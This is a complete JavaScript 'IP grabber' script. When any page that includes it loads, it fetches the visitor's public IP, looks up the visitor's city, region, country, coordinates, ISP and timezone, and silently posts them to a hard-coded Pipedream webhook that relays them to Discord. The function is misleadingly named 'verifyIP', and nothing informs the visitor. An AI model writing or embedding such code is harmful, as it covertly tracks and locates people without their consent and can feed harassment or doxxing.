document.addEventListener('DOMContentLoaded', (event) => {
  async function getUserIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Error fetching IP address:', error);
      return null;
    }
  }

  async function fetchIPInfo(ip) {
    try {
      const response = await fetch(`https://ipinfo.io/${ip}/json`);
      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Error fetching IP info:', error);
      return null;
    }
  }

  function formatEmbedData(ipInfo) {
    return {
      embeds: [
        {
          title: `IP Information for ${ipInfo.ip}`,
          description: `Detailed information about the IP address ${ipInfo.ip}.`,
          fields: [
            { name: 'City', value: ipInfo.city || 'N/A', inline: true },
            { name: 'Region', value: ipInfo.region || 'N/A', inline: true },
            { name: 'Country', value: ipInfo.country || 'N/A', inline: true },
            { name: 'Location', value: `${ipInfo.loc}`, inline: true },
            { name: 'Organization', value: ipInfo.org || 'N/A', inline: true },
            { name: 'Timezone', value: ipInfo.timezone || 'N/A', inline: true },
          ],
          footer: {
            text: `Requested by ${ipInfo.ip}`,
          },
        },
      ],
    };
  }

  async function sendIPInfoToDiscord(ipInfo) {
    const pipedreamUrl = 'https://eogiyp4bdjouqe0.m.pipedream.net'; // Replace with your Pipedream workflow URL
    try {
      const response = await fetch(pipedreamUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(ipInfo),
      });
      const result = await response.json();
      console.log('IP info sent to Discord:', result);
    } catch (error) {
      console.error('Error sending IP info to Discord:', error);
    }
  }

  async function verifyIP() {
    const ip = await getUserIP();
    if (ip) {
      const ipInfo = await fetchIPInfo(ip);
      if (ipInfo) {
        const embedData = formatEmbedData(ipInfo);
        sendIPInfoToDiscord(embedData);
      }
    }
  }

  // Call verifyIP when the DOM content is fully loaded
  verifyIP();
});
